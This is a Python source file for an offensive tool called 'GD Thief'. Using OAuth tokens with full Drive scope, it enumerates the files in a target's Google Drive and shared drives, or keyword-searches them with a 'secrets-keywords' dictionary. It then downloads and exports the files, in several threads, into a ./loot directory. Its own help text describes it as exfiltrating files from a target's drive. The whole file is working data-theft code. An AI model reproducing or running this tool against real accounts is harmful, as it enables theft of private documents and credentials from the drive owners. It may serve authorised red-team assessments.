#!/bin/env python3
### GD Thief
### Written by: Antonio "4n7m4n" Piazza @antman1p
import io
import os.path
import getopt
import sys
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from googleapiclient.http import MediaIoBaseDownload
from queue import Queue
import threading

### Full G-Drive API scope
SCOPES = ['https://www.googleapis.com/auth/drive']

### Builds the G-Drive API service
def build_service():
    creds = None
    # The file token.json stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists('./credentials/token.json'):
        creds = Credentials.from_authorized_user_file('./credentials/token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                './credentials/credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('./credentials/token.json', 'w') as token:
            token.write(creds.to_json())
    try:
        service = build('drive', 'v3', credentials=creds)
    except Exception as e:
        print('[*] An Error occured building the Google API service: %s' % str(e))
        sys.exit(2)
    return service

### Creates a list of all of the downloadable and exportable files in the victim's G-Drive
def list_files():
    service = build_service()
    ### DEBUG:
    #f = open("./tmp/file_list.txt", "w")

    filelist = []
    # Call the Drive v3 API
    page_token = None
    while True:
        results = service.files().list(q="mimeType != 'application/vnd.google-apps.folder' and mimeType != 'application/vnd.google-apps.shortcut'",
            spaces='drive',
            includeItemsFromAllDrives='true',
            supportsAllDrives='true',
            corpora='allDrives',
            fields="nextPageToken, files(id, name, mimeType)",
            pageToken=page_token).execute()

        try:
            items = results.get('files', [])
        except Exception as e:
            print('[*] An Error occured fetching file list from the G Drive: %s' % str(e))
            sys.exit(2)

        try:
            page_token = results.get('nextPageToken', None)
        except Exception as e:
            print('[*] An Error occured fetching the next pagination token: %s' % str(e))

        if page_token is None:
            break

        if not items:
            print('No files found.')
        else:
            for item in items:
                filelist.append(item['name'] + "|" + item['id'] + "|" + item['mimeType'])
                ### DEBUG:
                #f.write(item['name'] + "|" + item['id'] + "|" + item['mimeType'] + "\n")
    ### DEBUG:
    #f.close()

    return filelist

### Download's and Exports ALL files from the file list
def download_and_export(file_list):
    service = build_service()
    file_name, file_Id, mime = file_list.strip().split('|')
    file_name = file_name.replace(" ", "")
    file_name = file_name.replace(":", "")
    google_mime ='application/vnd.google-apps.'
    if google_mime in mime:
        request = service.files().export_media(fileId=file_Id,
          mimeType='application/pdf')
        file_name += ".pdf"
    else:
        request = service.files().get_media(fileId=file_Id)

    dl_path = "./loot/" + file_name
    fh = io.FileIO(dl_path, mode='wb')
    try:
        downloader = MediaIoBaseDownload(fh, request)
    except Exception as e:
        print('[*] An Error occured downloading a file from the G Drive: %s' % str(e))

    done = False

    while done is False:
        status, done = downloader.next_chunk()
        print ("Download %s %d%%." % (file_name,int(status.progress() * 100)))

def dictionary_search(path):
    service = build_service()
    try:
        f = open(path, "r")
    except Exception as e:
        print('[*] An Error occured opening the dictionary file: %s' % str(e))
        sys.exit(2)
    query_string = ""

    for line in f:
            search_term = line.strip()
            query_string += "fullText contains \'" + search_term + "\' or "
    query_string = ''.join(query_string.rsplit(' or ', 1))

    filelist = []
    # Call the Drive v3 API
    page_token = None
    while True:
        results = service.files().list(q=query_string,
            spaces='drive',
            includeItemsFromAllDrives='true',
            supportsAllDrives='true',
            corpora='allDrives',
            fields="nextPageToken, files(id, name, mimeType)",
            pageToken=page_token).execute()

        try:
            items = results.get('files', [])
        except Exception as e:
            print('[*] An Error occured fetching file list from the G Drive: %s' % str(e))
            sys.exit(2)

        try:
            page_token = results.get('nextPageToken', None)
        except Exception as e:
            print('[*] An Error occured fetching the next pagination token: %s' % str(e))

        if page_token is None:
            break

        if not items:
            print('No files found.')
        else:
            for item in items:
                filelist.append(item['name'] + "|" + item['id'] + "|" + item['mimeType'])
                ### DEBUG:
                #f.write(item['name'] + "|" + item['id'] + "|" + item['mimeType'] + "\n")
    ### DEBUG:
    #f.close()

    return filelist

### File Download Threader
def threader(q):
    while True:
        worker = q.get()
        download_and_export(worker)
        q.task_done()


def main():
    mode = ""
    thread = 1
    dict_path = ""

    # usage
    usage = '\nusage: python3 gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}\n'
    usage += '\t[-t <THREAD COUNT>]'
    #help
    help = '\nThis Module will connect to Google\'s API using an access token and '
    help += 'exfiltrate files\nfrom a target\'s Google Drive.  It will output exfiltrated '
    help += 'files to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-m [{dlAll, dlDict}],'
    help += '\n\t\t--mode [{dlAll, dlDict}]'
    help += '\n\t\tThe mode of file download'
    help += '\n\t\tCan be \"dlAll\", \"dlDict [-d <DICTIONARY FILE PATH>]\", or... (More options to come)'
    help += '\n\noptional arguments:'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\t\tPath to the dictionary file. Mandatory with download mode\"-m, --mode dlDict\"'
    help += '\n\t\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\t-t <THREAD COUNT>, --threads <THREAD COUNT>'
    help += '\n\t\t\tNumber of threads. (Too many could exceeed Google\'s rate limit threshold)'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'
    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hm:t:d:", ["help", "mode=", "threads=", "dict="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-m", "--mode"):
            mode = arg
        if opt in ("-t", "--threads"):
            thread = arg
        if opt in ("-d", "--dict"):
            dict_path = arg
    # check for mandatory arguments
    if not mode:
        print("\nMode  (-m, --mode) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    # Build the GDrive Service
    service = build_service()

    if mode == 'dlAll':
        print('[*] Scanning target G-Drive.  This could take a while...')
        filelist = list_files()
    elif mode == 'dlDict':
        if dict_path:
            try:
                os.stat(dict_path)
            except Exception as e:
                print('[*] Invalid file path error: %s' % str(e))
                sys.exit(2)
            print('[*] Scanning target G-Drive.  This could take a while...')
            filelist = dictionary_search(dict_path)
        else:
            print('\nArgument %s requires (-d, --dict) option\n' % mode)
            print(usage)
            sys.exit(2)
    else:
        print('\nInvalid argument (-m, --mode): %s\n' % mode)
        print(usage)
        sys.exit(2)

    q = Queue()
    print('[*] Downloading Files...')
    for x in range(int(thread)):
        t = threading.Thread(target=threader, args=(q,))
        t.daemon = True
        t.start()
    for file in filelist:
        q.put(file)
    q.join()
    print('[*] Drive download complete.')
    exit(0)

if __name__ == '__main__':
    main()
